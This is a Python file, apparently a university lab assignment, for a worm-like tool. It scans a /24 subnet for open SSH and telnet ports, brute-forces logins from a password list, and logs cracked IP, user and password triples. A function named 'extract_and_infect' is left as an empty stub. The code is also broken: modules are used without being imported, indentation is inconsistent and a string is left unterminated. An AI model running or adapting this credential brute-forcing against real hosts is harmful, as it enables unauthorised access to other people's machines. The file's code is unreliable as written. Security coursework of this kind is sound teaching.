 from FileOperations import FileOperations
import subprocess

def find_vulnerable_machines(ip_bytes):
    '''
    Input:
    First three bytes of an ip; Assuming a /24 subnet where there are 254 available ips.

    Output: 
    None.
    Creates open_ssh.log and open_telnet.log;
    File of addresses with open ports using either ssh or telnet.

    '''
    # Runs try_ports.sh
    subprocess.run(["bash", "./try_ports.sh", ip_bytes])

def find_vulnerable_users():
    '''
    Output:
    ssh_accounts.log
    telnet_accounts.log
    - File in ip,user,passwd format of cracked users.

    '''
    sys.tracebacklimit=0
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open("/home/cse/Lab2/Q2pwd") as file:
        user_combos = file.readlines()
    user_combos = [u.strip().split(" ")for u in user_combos]

    with open("open_ssh.log") as file:
        ssh_log = file.readlines()
    ssh_log = [ip.strip() for ip in ssh_log]
    with open("open_telnet.log") as file:
        telnet_log = file.readlines()
    telnet_log = [ip.strip() for ip in telnet_log]
    for ip in ssh_log:
          for user, password in user_combos:
              while True:
                  try:
                      client.connect(ip, username=user, password=password, timeout=200)
                      with open("ssh_accounts.log", "a") as file:
                          file.write(f"{ip},{user},{password}\n")
                          break
                  except paramiko.ssh_exception.AuthenticationException:
                      break
                  except paramiko.ssh_exception.SSHException:
                      pass
      for ip in telnet_log:
          for user, password in user_combos:
              tn = telnetlib.Telnet(ip)
              tn.read_until(b"login: ")
              tn.write(user.encode('ascii') + b"\n")
              tn.read_until(b"Password: ")
              tn.write(password.encode('ascii') + b"\n")
              if tn.read_until(b"Welcome", timeout=1) == b"\r\nWelcome":
                  with open("telnet_accounts.log", "a") as file:
                          file.write(f"{ip},{user},{password}\n")

def extract_and_infect():
    '''
    
    
    '''
    pass

if __name__ == '__main__':
    ip_bytes = "10.13.4
    find_vulnerable_machines(ip_bytes)
